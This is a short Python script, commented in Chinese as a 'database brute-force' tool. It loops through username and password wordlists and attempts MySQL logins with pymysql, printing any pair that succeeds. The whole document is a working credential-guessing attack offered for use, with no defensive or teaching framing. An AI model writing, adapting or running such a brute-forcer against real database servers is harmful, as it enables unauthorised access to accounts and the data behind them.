'''
数据库爆破
'''
import pymysql
with open('username.txt','r') as fh:
    username = fh.readline().strip()
    while username:
        with open('password.txt','r') as pd:
            password = pd.readline().strip()
            while password:
                try:
                    conn = pymysql.connect(host='localhost', user=username, passwd=password)
                except:
                    pass
                else:
                    print('爆破成功！用户名为：', username, '密码为：', password)
                    break
                finally:
                    password = pd.readline().strip()
        username = fh.readline().strip()